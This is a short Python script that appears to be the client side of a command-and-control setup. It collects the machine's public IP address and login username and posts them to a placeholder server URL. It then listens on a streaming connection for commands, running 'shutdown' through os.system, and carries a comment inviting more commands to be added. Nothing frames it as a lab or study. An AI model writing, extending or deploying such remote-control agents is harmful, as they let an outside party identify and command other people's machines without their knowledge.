import requests
from datetime import datetime
from threading import Thread
import os


CONN_URL = "HTTP://CONNECTION_URL_HERE"

id = int(datetime.now().timestamp())
ip = requests.get("https://api.ipify.org").text
username = os.getlogin()
data = {"ip": ip, "id": id, "username": username}

def cmd_rec(command):
	# ADD COMMANDS HERE
    if command == "shutdown":
        os.system("shutdown")
    print(command)

def listen():
    response = requests.post(CONN_URL, json=data, stream=True)
    for line in response.iter_lines():
        if line:
            line = line.decode("utf-8")
            if line.startswith("null") == False:
                line = line[:-4]
                cmd_rec(line)

t = Thread(target=listen)
t.start()